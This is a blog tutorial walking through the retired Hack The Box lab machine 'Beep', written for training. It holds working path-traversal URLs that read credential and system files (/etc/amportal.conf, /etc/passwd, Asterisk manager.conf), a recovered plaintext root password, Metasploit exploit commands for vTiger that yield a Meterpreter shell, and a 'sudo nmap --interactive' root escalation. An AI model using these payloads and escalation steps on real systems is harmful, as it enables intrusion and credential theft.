---
title: Keep Calm and Hack The Box - Beep
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-09-03T19:57:43.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-beep
coverImage: https://www.freecodecamp.org/news/content/images/2019/09/126406-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-19.49.24.png)

**Beep** is described as having a very large list of running services, which can make it a bit challenging to find the correct entry method. The machine can be a little overwhelming for some as there are many potential attack vectors

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [dirbuster](https://tools.kali.org/web-applications/dirbuster)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## **Step 1 - Scanning the network**

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as possible.

I will use **Nmap** (Network Mapper), which is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.16.21.png)

I use the following command to get a basic idea of what we are scanning

```bash
nmap -sV -O -F --version-light 10.10.10.7
```

**-sV:** Probe open ports to determine service/version info

**-O:** Enable OS detection

**-F:** Fast mode - Scan fewer ports than the default scan

**--version-light:** Limit to most likely probes (intensity 2)

**10.10.10.**7**:** IP address of the Beep box

You can also use **Zenmap**, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.31.06.png)

I use a different set of commands to perform an intensive scan

```bash
nmap -A -v 10.10.10.7
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**10.10.10.7:** IP address of the Beep box

If you find the results a little bit too overwhelming, you can move to the **Ports/Hosts** tab to only get the open ports.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-20.34.28.png)

We can see that there are 12 open ports:

**Port** 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding

**Port** 25. Simple Mail Transfer Protocol (SMTP) used for email routing between mail servers

**Port** 80. Hypertext Transfer Protocol (HTTP). Here it's an Apache httpd 2.2.3

**Port** 110. Post Office Protocol, version 3 (POP3)

**Port** 111. Open Network Computing Remote Procedure Call (**ONC RPC**, sometimes referred to as **Sun RPC**)

**Port** 143. Internet Message Access Protocol (IMAP), management of electronic mail messages on a server

**Port** 443. Hypertext Transfer Protocol over TLS/SSL (HTTPS)

**Port** 993. Internet Message Access Protocol over TLS/SSL (IMAPS)

**Port** 995. Post Office Protocol 3 over TLS/SSL (POP3S)

**Port** 3306. MySQL database system

**Port** 4445. I2P HTTP/S proxy

**Port** 10000. Webmin, Web-based Unix/Linux system administration tool (default port)

Nmap finds quite a long list of services. For now, Apache, which is running on ports 80 and 443, will be the primary target.

## **Step 2 - Enumerating the directories**

Still in the scanning and reconnaissance phase, I now use **DirBuster**. DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers.  

You can launch DirBuster by typing this command on the terminal

```bash
dirbuster
```

or by searching the application

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.01.31-1.png)

The application looks like this, where you can specify the target URL. In our case it will be **https://10.10.10.7**. You can select a file with the list of dirs/files by clicking the Browse button

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.08.31.png)

I use the **directory-list-2.3-medium.txt** for this search

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.35.45.png)

DirBuster finds a huge list of directories with several content management systems and open source applications. There are several vulnerabilities that can lead to shell amongst the results.

## **Step 3 - Visiting the website**

Let's try port 80 and visit http://10.10.10.7

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.42.59.png)

The website is redirected to https://10.10.10.7 and we need to add a **security exception** to the website to continue

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.44.18.png)

We finally land on the website which is an **Elastix Login Portal**. Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialling

An **IP PBX** ("Internet Protocol private branch exchange") is a system that connects telephone extensions to the public switched telephone network (PSTN) and provides internal communication for a business

If you want to learn more about Elastix, you can have a look [h](https://www.elastix.org/)ere

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-22.48.13.png)

I try the default credentials, but it doesn't seem to work

```bash
Username: admin
Password: palosanto
```

Having a look at the source code doesn't help either

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.19.09.png)

I will use **Searchsploit** to check if there's any known vulnerability on Elastix. Searchsploit is a command line search tool for **Exploit Database**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.42.23.png)

I use the following command

```bash
searchsploit elastix
```

We can see several vulnerabilities, but we will examine the **'graph.php' Local File Inclusion** with this command

```bash
searchsploit -x 37637.pl
```

We have a summary of the exploit and the code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.44.25.png)

The **LFI Exploit** is the following

```url
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

An attacker can use **Local File Inclusion (LFI)** to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS)

You can also check the **Exploit Database** to find the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.55.43.png)
_[https://www.exploit-db.com/search?q=elastix](https://www.exploit-db.com/search?q=elastix)_

You will get the same results as on the terminal. If you navigate to the **2.0 - 'graph.php' Local File Inclusion**, you will have a description of the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.29.43.png)
_[https://www.exploit-db.com/exploits/37637](https://www.exploit-db.com/exploits/37637)_

If you remember from **step 2**, the directory enumeration flagged a **vTiger CRM**. 

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-23.30.28.png)

vTiger CRM is an integrated customer relationship management (CRM) application that can be used on the Intranet or from the Internet using a browser. It is distributed under a free license

If you want to learn more about vTiger CRM, you can have a look [[h](https://www.vtiger.com/)ere](null)

You can also read more about the integration between Elastix and vTigerCRM [here](https://crmtiger.com/vtiger-elastix-integration.html)

## **Step 4 - Trying the elastix LFI exploit**

Let's navigate to 

```url
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.01.36.png)
_https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&amp;module=Accounts&amp;action_

If you can't read anything, you can prettify the file by checking the source file

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.07.17.png)
_view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&amp;module=Accounts&amp;action_

I find a password **jEhdIekWmdjE**

If you remember from **step 1**, the nmap scan flagged **port 22** as opened, let's try the newly found password on it

## **Step 5 - Connecting to SSH**

Let's connect to the SSH with the following command

```bash
ssh root@10.10.10.7
```

I try the password and I'm in!

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.13.18.png)

## Step 6 - Looking for the root.txt flag

I can now look for the first flag, **root.txt**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.17.19.png)

I use the following command to check who am I on this machine

```bash
whoami
```

I have root access to the machine. I got the power! 

I use the following command to check where I am on the machine

```bash
pwd
```

I'm in /root and by doing 

```bash
ls
```

I find the root.txt file! To read the content of the file I use the command

```bash
cat root.txt
```

Now that we have the root flag, let's find the user flag!

## Step 7 - Looking for the user.txt flag

I need to navigate back to the home directory by doing 

```bash
cd home
```

I then list all the files/folders and see there's a folder called **fanis**

I navigate to this folder with

```bash
cd fanis
```

And when I list the files/folders, I can see the **user.txt** file!

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.21.05.png)

To read the content of the file I use the command

```bash
cat user.txt
```

Congrats! You found both flags!

---

> Variations for Informational findings

## **Step 3b - Visiting the website**

Let's navigate to 

```url
https://10.10.10.7/vtigercrm/
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.32.52.png)
_https://10.10.10.7/vtigercrm/_

We can see the version of the application: **vTiger CRM 5.1.0**

I will use Searchsploit to check if there's any known vulnerability on vTigerCRM

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.35.42.png)

I use the following command

```bash
searchsploit vtiger
```

We can see several vulnerabilities. I examine the Local File Inclusion with this command

```bash
searchsploit -x 18770.txt
```

I have a summary of the exploit and the code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.38.12.png)

The LFI Exploit is the following

```bash
/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

You can also check the exploit database to find the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.42.56.png)

You will get the same results on the terminal. If you navigate to the **vTiger 5.1.0 - Local File Inclusion**, you will have a description of the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.43.11.png)

## **Step 4b - Doing more recon around the vTiger Asterisk default credentials**

Let's navigate to 

```url
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```



![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.40.38.png)
_https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00_

If you can't read anything, you can prettify the file by checking the source file

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.41.34.png)
_view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00_

I also do some research on **default credentials** for vTiger and find some documentation around installing **vTiger Asterisk Connector**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-01-at-20.44.49.png)
_[https://www.vtiger.com/docs/asterisk-integration](https://www.vtiger.com/docs/asterisk-integration)_

If we modify the previous URL to 

```url
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00
```

I navigate to this page (using source code to prettify the output)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-00.55.05.png)
_https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00_

I find a password **jEhdIekWmdjE**

You can continue to **Step 5** from there

---

> Variations using Metasploit, meterpreter, nmap --interactive and Burp

## **Step 3c - Visiting the website**

We know that the version of the application is **vTiger CRM 5.1.0**

We will use **Metasploit**, which is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

I launch **Metasploit Framework** on Kali and look for command I should use to launch the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-01.09.39.png)

I find an interesting payload, number 3

```bash
exploit/multi/http/vtiger_soap_upload
```

This is the description of the exploit

> vTiger CRM allows an user to bypass authentication when requesting SOAP services. In addition, arbitrary file upload is possible through the AddEmailAttachment SOAP service. By combining both vulnerabilities an attacker can upload and execute PHP code. This module has been tested successfully on vTiger CRM v5.4.0 over Ubuntu 10.04 and Windows 2003 SP2.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-01.12.00.png)
_[https://www.exploit-db.com/exploits/30787](https://www.exploit-db.com/exploits/30787)_

I use the following command for the exploit

```bash
use exploit/multi/http/vtiger_soap_upload
```

I need to set up several options before launching the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-10.04.01.png)

I start by setting the **RHOSTS** with the following command

```bash
set RHOSTS 10.10.10.7/32
```

I set the **SSL** and the **RPORT** with

```bash
set SSL true
```

and

```bash
set RPORT 443
```

I run the exploit, but I need to set the correct **LPORT** this time with

```bash
set LPORT 10.10.14.10
```

Here is a sum up of all the commands

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.24.34.png)

I check the options

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.26.36.png)

I run the exploit with the command

```bash
run
```

I get this error message

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.28.54.png)

I set up the proxy with the following command

```bash
set proxies http:127.0.0.1:8080
```

I check the options again

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.29.34.png)

I run the exploit but I get a new error message

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.31.44.png)

I set it with this command

```bash
set ReverseAllowProxy true
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.54.57.png)

I also need to set up **Burp** to proxy the exploit. 

**Burp Suite** is a Java based Web Penetration Testing framework. It has become an industry standard suite of tools used by information security professionals. Burp Suite helps identify vulnerabilities and verify attack vectors that are affecting web applications

You can learn more on the official website [here](https://portswigger.net/burp)

Open Burp and set the target to the website in Target > Scope > Target Scope > Include in scope > edit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.33.40.png)

I run the exploit on **Metasploit** and go back to **Burp**. I can see Burp intercepted the request

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.35.29.png)

I set the Intercept option to **off**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-11.36.49.png)

Back on **Metasploit**, I finally get a **Meterpreter** session

From the [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.54.30.png)

## Step 4c - Looking for the user.txt flag

I navigate to the **root** directory to find the home folder. I then move to the home directory with 

```bash
cd home
```

You can list files/folder with

```bash
ls -la
```

I find a folder called **fanis**. Let's see what's inside with

```bash
cd fanis
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-17.58.43.png)

I list all files/folders and I find the **user.txt** flag. To read the content of the file I use the command

```bash
cat user.txt
```

Now that we have the user flag, let's find the root flag!

## Step 5c - Looking for the root.txt flag

I can't access the root folder, but I can create a **shell** with the command

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.04.32.png)

If I check who I am on the machine, I get

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.05.40.png)

If you do

```bash
sudo -l
```

you can see many **NOPASSWD** commands which can lead us to getting root

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.11.44.png)

Older versions of Nmap (2.02 to 5.21) had an interactive mode which allowed users to execute shell commands.  Since Nmap is in the list of binaries that is executed with root privileges it is possible to use the interactive console in order to run a shell with the same privileges

Let's try it with the following command

```bash
sudo nmap --interactive
```

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.14.50.png)

The following command will give an elevated shell. You can read more on the Bourne shell [here](https://en.wikipedia.org/wiki/Bourne_shell)

```bash
!sh
```

I check who I am on the machine, and I have **root** access

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.17.23.png)

I can now navigate to the root directory

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-03-at-18.22.36.png)

I find the **root.txt.txt** file! 

To read the content of the file I use the command

```bash
cat root.txt
```

Congrats! You found both flags!

---

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/126406.jpg)

